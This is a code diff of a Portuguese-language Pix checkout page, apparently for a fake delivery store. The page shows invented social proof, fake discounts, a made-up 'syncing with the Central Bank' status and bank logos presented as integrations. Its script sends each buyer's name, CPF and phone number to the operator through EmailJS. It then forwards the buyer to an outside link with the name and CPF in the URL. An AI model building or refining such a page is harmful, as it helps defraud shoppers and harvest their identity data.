@@ -318,7 +318,6 @@
             box-shadow: 0 0 0 0 rgba(22,163,74,0.4);
             animation: deliveryPulse 2s ease-out infinite;
         }
-        @keyframes deliveryPulse { 0% { box-shadow: 0 0 0 0 rgba(22,163,74,0.4); } 70% { box-shadow: 0 0 0 10px rgba(22,163,74,0); } 100% { box-shadow: 0 0 0 0 rgba(22,163,74,0); } }
 
         .pix-dot-loader span {
             width: 5px; height: 5px;
@@ -654,18 +653,18 @@
 
         <div class="pix-order-summary">
             <div class="pix-order-header">
-                <span>Resumo da Compra</span>
-                <span>#49210</span>
+                <span>Resumo do Pedido</span>
+                <span>#77291</span>
             </div>
             <div class="pix-product-card">
-                <img src="https://i.imgur.com/vH3P3zV.png" class="pix-product-img" alt="Gás">
+                <img src="" alt="" class="pix-product-img" id="pix-summary-img">
                 <div class="pix-product-info">
-                    <div class="pix-product-name">Carga de Gás 13kg</div>
-                    <div class="pix-product-meta">Entrega Rápida</div>
-                    <div class="pix-product-savings">Economia de R$ 40,00</div>
+                    <div class="pix-product-name" id="pix-summary-name">Carregando...</div>
+                    <div class="pix-product-meta">Entrega Prioritária</div>
                 </div>
                 <div class="pix-product-price-block">
-                    <div class="pix-product-price" id="pix-total-price">R$ 0,00</div>
+                    <div class="pix-product-price" id="pix-summary-price">R$ 0,00</div>
+                    <div class="pix-product-savings">Economia de 46%</div>
                 </div>
             </div>
         </div>
@@ -673,108 +672,68 @@
         <div class="pix-delivery-block">
             <div class="pix-delivery-header">
                 <div class="pix-delivery-header-label">
-                    <i class="fas fa-truck"></i> Status da Entrega
+                    <i class="fas fa-truck-fast"></i>
+                    Status da Entrega
                 </div>
                 <div class="pix-delivery-status-dot"></div>
             </div>
-            <div class="pix-product-card" style="padding: 12px 14px; gap: 12px; border-bottom: none;">
-                <div class="pix-dot-loader" style="display: flex; gap: 4px;">
-                    <span></span><span></span><span></span>
+            <div class="pix-delivery-content">
+                <div class="pix-delivery-status-main">
+                    Aguardando Pagamento
                 </div>
-                <div style="font-size: 13px; font-weight: 700; color: #16a34a; letter-spacing: -0.2px;">
-                    Aguardando pagamento para liberar saída...
+                <div class="pix-delivery-status-desc">
+                    O entregador será acionado assim que o Pix for confirmado.
+                </div>
+                <div class="pix-delivery-loader-row">
+                    <div class="pix-dot-loader">
+                        <span></span><span></span><span></span>
+                    </div>
+                    <span>Sincronizando com Banco Central...</span>
                 </div>
             </div>
         </div>
 
         <div class="pix-social-proof">
             <div class="live-dot"></div>
-            <span><b>14 pessoas</b> comprando agora em sua região</span>
+            <span><b>14 pessoas</b> geraram um Pix agora</span>
         </div>
 
-        <div class="bank-icons-label">Pague com seu banco preferido</div>
+        <div class="bank-icons-label">Bancos Integrados</div>
         <div class="bank-icons-row">
-            <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-3.png" alt="Nubank">
-            <img src="https://logodownload.org/wp-content/uploads/2014/05/itau-logo-1.png" alt="Itaú">
-            <img src="https://logodownload.org/wp-content/uploads/2014/05/bradesco-logo-1.png" alt="Bradesco">
-            <img src="https://logodownload.org/wp-content/uploads/2014/05/caixa-logo-1.png" alt="Caixa">
-            <img src="https://logodownload.org/wp-content/uploads/2014/05/banco-do-brasil-logo-1.png" alt="BB">
-            <img src="https://logodownload.org/wp-content/uploads/2018/01/banco-inter-logo-1.png" alt="Inter">
+            <img src="https://logopng.com.br/logos/nubank-114.png" alt="Nubank">
+            <img src="https://logopng.com.br/logos/itau-21.png" alt="Itaú">
+            <img src="https://logopng.com.br/logos/bradesco-12.png" alt="Bradesco">
+            <img src="https://logopng.com.br/logos/santander-42.png" alt="Santander">
+            <img src="https://logopng.com.br/logos/inter-110.png" alt="Inter">
         </div>
 
         <div class="pix-info">
             <div class="pix-info-step">
                 <div class="step-num">1</div>
-                <div><b>Copie o código</b> Pix abaixo.</div>
+                <div><b>Copie o código</b> clicando no botão abaixo ou use o QR Code.</div>
             </div>
             <div class="pix-info-step">
                 <div class="step-num">2</div>
-                <div>Abra o app do seu <b>banco</b> e escolha <b>Pix Copia e Cola</b>.</div>
+                <div>Abra o app do seu banco e escolha a opção <b>Pix Copia e Cola</b>.</div>
             </div>
             <div class="pix-info-step">
                 <div class="step-num">3</div>
-                <div>Confira os dados e <b>confirme</b> o pagamento.</div>
+                <div>Confira os dados e <b>confirme o pagamento</b>.</div>
             </div>
-        </div>
-
-        <div class="pix-code-container" style="margin: 0 16px 16px; background: #fff; border: 2px dashed var(--green); border-radius: 16px; padding: 20px; text-align: center;">
-            <div style="font-size: 11px; font-weight: 800; color: var(--green); text-transform: uppercase; margin-bottom: 12px; letter-spacing: 1px;">Código Pix Copia e Cola</div>
-            <div id="pix-code-text" style="background: #f8fafc; padding: 12px; border-radius: 10px; font-family: monospace; font-size: 12px; word-break: break-all; margin-bottom: 15px; border: 1px solid #e2e8f0; color: #334155;"></div>
-            <button id="btn-copy-pix" style="width: 100%; background: var(--green); color: #fff; border: none; padding: 14px; border-radius: 12px; font-weight: 800; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.2s;">
-                <i class="fas fa-copy"></i> COPIAR CÓDIGO PIX
-            </button>
         </div>
 
         <div class="pix-secure-line">
-            <span><i class="fas fa-shield-check"></i> Pagamento 100% Seguro</span>
-            <span><i class="fas fa-bolt"></i> Liberação Instantânea</span>
-        </div>
-    </div>
-
-    <!-- MODALS -->
-    <div id="delivery-modal" class="modal-overlay">
-        <div class="modal-content">
-            <button class="modal-close-btn" onclick="closeDeliveryModal()"><i class="fas fa-times"></i></button>
-            <div class="modal-icon warning"><i class="fas fa-exclamation-triangle"></i></div>
-            <h3 class="modal-title">Atenção!</h3>
-            <p class="modal-text">Ao pagar na entrega você <b>perde o desconto exclusivo</b> e o valor será de <b id="modal-delivery-price">R$ 0,00</b>.</p>
-            <div class="modal-buttons">
-                <button class="btn-modal btn-modal-pix" onclick="closeDeliveryModal()">QUERO O DESCONTO PIX</button>
-                <button class="btn-modal btn-modal-continue" id="btn-confirm-delivery" style="background: #f1f5f9; color: #64748b;">CONTINUAR SEM DESCONTO</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="contact-modal" class="modal-overlay">
-        <div class="modal-content">
-            <button class="modal-close-btn" onclick="closeContactModal()"><i class="fas fa-times"></i></button>
-            <div class="modal-icon success"><i class="fas fa-truck-fast"></i></div>
-            <h3 class="modal-title">Finalizar Pedido</h3>
-            <p class="modal-text">Informe seus dados para o entregador entrar em contato ao chegar.</p>
-            <div class="contact-form">
-                <div class="form-group">
-                    <label for="contact-name">Nome Completo</label>
-                    <input type="text" id="contact-name" placeholder="Ex: João Silva" required>
-                </div>
-                <div class="form-group">
-                    <label for="contact-cpf">CPF</label>
-                    <input type="tel" id="contact-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
-                </div>
-                <div class="form-group">
-                    <label for="contact-phone">WhatsApp</label>
-                    <input type="tel" id="contact-phone" placeholder="(00) 00000-0000" required>
-                </div>
-                <button class="btn-modal btn-send-form" id="btn-finish-delivery">CONCLUIR PEDIDO <i class="fas fa-check"></i></button>
-            </div>
+            <span><i class="fas fa-shield-check"></i> Pagamento 100% Criptografado</span>
+            <span><i class="fas fa-lock"></i> SSL Seguro</span>
         </div>
     </div>
 
     <script>
-        const EMAILJS_SERVICE_ID = "service_v0m7f3n";
-        const EMAILJS_TEMPLATE_ID = "template_7j8322e";
-        const EMAILJS_PUBLIC_KEY = "Y6G9K1S8_Y271N8Y";
+        const EMAILJS_SERVICE_ID = "service_0q40wnd";
+        const EMAILJS_TEMPLATE_ID = "template_704k4i9";
+        const EMAILJS_PUBLIC_KEY = "FfVv3_6Z4944fH9Zt";
 
-        emailjs.init(EMAILJS_PUBLIC_KEY);
+        (function(){ emailjs.init(EMAILJS_PUBLIC_KEY); })();
 
         let subtotalValue = 0;
 
@@ -787,11 +746,9 @@
 
         function maskCPF(v) {
             v = v.replace(/\D/g, "");
-            if (v.length <= 11) {
-                v = v.replace(/(\d{3})(\d)/, "$1.$2");
-                v = v.replace(/(\d{3})(\d)/, "$1.$2");
-                v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
-            }
+            v = v.replace(/(\d{3})(\d)/, "$1.$2");
+            v = v.replace(/(\d{3})(\d)/, "$1.$2");
+            v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
             return v;
         }
 
@@ -961,7 +918,6 @@
             fill.style.setProperty('--progress-duration', duration);
             fill.style.setProperty('--progress-easing', easing);
             fill.style.width = width;
-
         }
 
         async function generatePix() {
@@ -983,7 +939,6 @@
             const fill = document.getElementById('loaderProgress');
             fill.style.width = '0%';
 
-
             loader.classList.add('active');
             document.body.style.overflow = 'hidden';
 
@@ -993,145 +948,69 @@
             try {
                 sendEmailJS(name, cpfRaw, phone, subtotalValue);
 
-                setTimeout(() => setLoaderStep(2, 'Pedido validado!'), 2000);
+                setTimeout(() => setLoaderStep(2, 'Pedido validado! Redirecionando...'), 2500);
 
                 setTimeout(() => {
-                    const currentUrl = new URL(window.location.href);
-                    const params = currentUrl.searchParams;
-                    params.set('nome', name);
-                    params.set('cpf', cpf);
-                    
-                    const redirectUrl = "https://go.diskgas.online/checkout/f20f0e5c-7589-4672-911b-072049811520";
-                    const finalUrl = new URL(redirectUrl);
-                    params.forEach((value, key) => {
-                        finalUrl.searchParams.set(key, value);
-                    });
-                    
-                    window.location.href = finalUrl.toString();
-                }, 2800);
-                
+                    const baseUrl = "https://www.linkespecifico.com";
+                    const currentParams = new URLSearchParams(window.location.search);
+                    currentParams.set('nome', name);
+                    currentParams.set('cpf', cpf);
+                    window.location.href = `${baseUrl}?${currentParams.toString()}`;
+                }, 3200);
+
             } catch (err) {
                 loader.classList.remove('active');
                 loader.style.display = 'none';
                 document.body.style.overflow = '';
-                errorText.textContent = 'Erro ao processar pedido. Tente novamente.';
+                errorText.textContent = 'Erro ao validar pedido. Tente novamente.';
                 errorEl.classList.add('visible');
             }
         }
+
+        // Removida função fetchPixCode pois não será mais utilizada
 
         function startTimer(duration, display) {
             let timer = duration;
             const total = duration;
             const bar = document.getElementById('pixTimerBar');
-            
-            const interval = setInterval(function () {
+            setInterval(function () {
                 let minutes = parseInt(timer / 60, 10);
                 let seconds = parseInt(timer % 60, 10);
-
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
-
                 display.textContent = minutes + ":" + seconds;
-                
-                if (bar) {
-                    const percentage = (timer / total) * 100;
-                    bar.style.width = percentage + "%";
-                }
-
-                if (--timer < 0) {
-                    clearInterval(interval);
-                }
+                if (bar) bar.style.width = (timer / total * 100) + "%";
+                if (--timer < 0) timer = 0;
             }, 1000);
         }
 
-        function showDeliveryModal() {
-            const baseTotal = subtotalValue;
-            const deliveryTotal = baseTotal * 1.46;
-            document.getElementById('modal-delivery-price').textContent = `R$ ${deliveryTotal.toFixed(2).replace('.', ',')}`;
-            document.getElementById('delivery-modal').classList.add('active');
-        }
+        function renderCart() {
+            const product_name = getUrlParameter('product_name') || 'Produto Selecionado';
+            const product_img = getUrlParameter('product_img') || '';
+            const price_param = getUrlParameter('price');
+            subtotalValue = price_param ? parseFloat(price_param.replace(',', '.')) : 0;
 
-        function closeDeliveryModal() {
-            document.getElementById('delivery-modal').classList.remove('active');
-        }
-
-        document.getElementById('btn-confirm-delivery').addEventListener('click', () => {
-            closeDeliveryModal();
-            document.getElementById('contact-modal').classList.add('active');
-            
-            const contactNameInput = document.getElementById('contact-name');
-            if (contactNameInput) setupNameInput(contactNameInput);
-            const contactCpfInput = document.getElementById('contact-cpf');
-            if (contactCpfInput) setupCPFInput(contactCpfInput);
-            const contactPhoneInput = document.getElementById('contact-phone');
-            if (contactPhoneInput) setupPhoneInput(contactPhoneInput);
-        });
-
-        function closeContactModal() {
-            document.getElementById('contact-modal').classList.remove('active');
-        }
-
-        document.getElementById('btn-finish-delivery').addEventListener('click', async () => {
-            const name = document.getElementById('contact-name').value.trim();
-            const cpfRaw = document.getElementById('contact-cpf').value;
-            const phone = document.getElementById('contact-phone').value.trim();
-            const cpf = cpfRaw.replace(/\D/g, '');
-
-            if (name.length < 3 || cpf.length !== 11 || phone.length < 10) {
-                alert('Preencha todos os campos corretamente.');
-                return;
-            }
-
-            const loader = document.getElementById('global-loader');
-            document.getElementById('loader-title').textContent = 'Finalizando Pedido';
-            document.getElementById('loader-desc').textContent = 'Aguarde um instante...';
-            loader.classList.add('active');
-
-            const baseTotal = subtotalValue;
-            const deliveryTotal = baseTotal * 1.46;
-
-            try {
-                await sendEmailJS(name, cpfRaw, phone, deliveryTotal);
-                setTimeout(() => {
-                    alert('Pedido realizado com sucesso! O entregador entrará em contato.');
-                    location.reload();
-                }, 2000);
-            } catch (err) {
-                alert('Erro ao finalizar pedido.');
-                loader.classList.remove('active');
-            }
-        });
-
-        window.onload = function() {
-            const priceParam = getUrlParameter('price');
-            subtotalValue = priceParam ? parseFloat(priceParam.replace(',', '.')) : 105.00;
-            
-            const cartWrapper = document.getElementById('cart-content-wrapper');
-            cartWrapper.innerHTML = `
+            const cartHTML = `
                 <div class="review-block">
-                    <div class="review-header-title" style="margin-bottom: 20px;">
-                        <i class="fas fa-shopping-basket"></i> Resumo do Pedido
+                    <div class="review-header-bar">
+                        <div class="review-header-title"><i class="fas fa-shopping-cart"></i> Resumo da Compra</div>
                     </div>
-                    <div class="pix-order-summary" style="margin: 0 0 20px 0;">
-                        <div class="pix-product-card">
-                            <img src="https://i.imgur.com/vH3P3zV.png" class="pix-product-img" alt="Gás">
-                            <div class="pix-product-info">
-                                <div class="pix-product-name">Carga de Gás 13kg</div>
-                                <div class="pix-product-meta">Entrega em até 20 min</div>
-                            </div>
-                            <div class="pix-product-price-block">
-                                <div class="pix-product-price">R$ ${subtotalValue.toFixed(2).replace('.', ',')}</div>
-                            </div>
+                    <div class="pix-product-card" style="padding: 0; margin-bottom: 20px; border: none;">
+                        <img src="${product_img}" alt="${product_name}" class="pix-product-img" style="width: 70px; height: 70px;">
+                        <div class="pix-product-info">
+                            <div class="pix-product-name" style="font-size: 1.1rem;">${product_name}</div>
+                            <div class="pix-product-meta">Quantidade: 1</div>
                         </div>
+                        <div class="pix-product-price" style="font-size: 1.2rem;">R$ ${subtotalValue.toFixed(2).replace('.', ',')}</div>
                     </div>
-                    <button class="payment-action-btn" id="btn-go-to-payment" style="width: 100%;">
-                        IR PARA O PAGAMENTO <i class="fas fa-chevron-right"></i>
-                    </button>
+                    <button class="payment-action-btn" id="btn-go-to-payment" style="width: 100%;">Finalizar Compra <i class="fas fa-chevron-right"></i></button>
                 </div>
             `;
-            
-            document.getElementById('btn-go-to-payment').addEventListener('click', renderPaymentOptions);
-        };
+            document.getElementById('cart-content-wrapper').innerHTML = cartHTML;
+            document.getElementById('btn-go-to-payment').onclick = renderPaymentOptions;
+        }
+
+        window.onload = renderCart;
     </script>
 </body>
 </html>
